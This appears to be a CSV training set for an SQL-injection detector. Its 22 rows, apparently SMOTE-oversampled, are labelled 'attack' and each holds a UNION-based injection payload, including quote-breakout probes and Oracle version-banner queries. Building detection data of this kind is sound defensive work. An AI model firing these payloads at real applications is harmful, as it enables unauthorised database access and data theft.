id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000206,0.1989743864400784
SMOTE_000002,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000143,1.072973275580188
SMOTE_000003,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000155,0.3099904426637172
SMOTE_000004,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000234,0.2793624131972355
SMOTE_000005,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000129,0.07640100307882439
SMOTE_000006,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000098,0.5974249943846973
SMOTE_000007,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000099,0.27080057416801845
SMOTE_000008,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000199,1.06303294417206
SMOTE_000009,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000037,1.3411440080409838
SMOTE_000010,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000138,0.6601204121333646
SMOTE_000011,attack,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000035,0.24543775316581384
SMOTE_000012,attack,union,"-4280%""   )    )     )   union all select 7981,7981--",nearest_attack_euclidean,R000164,0.06801095772692779
SMOTE_000013,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000306,0.12796069488365952
SMOTE_000014,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000089,0.10064323864174625
SMOTE_000015,attack,union,"-4947' in boolean mode  )   union all select 3314,3314#",nearest_attack_euclidean,R000132,0.2833334420889446
SMOTE_000016,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000257,0.03483064336028617
SMOTE_000017,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000009,0.0
SMOTE_000018,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000037,0.3325107744220102
SMOTE_000019,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R000232,0.8152069546978741
SMOTE_000020,attack,union,"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",nearest_attack_euclidean,R000202,0.8415530336537936
SMOTE_000021,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000009,0.1485091082945389
SMOTE_000022,attack,union,"-4015'||  (  select 'qeqv' from dual where 1437  =  1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",nearest_attack_euclidean,R000243,0.6331791453958252
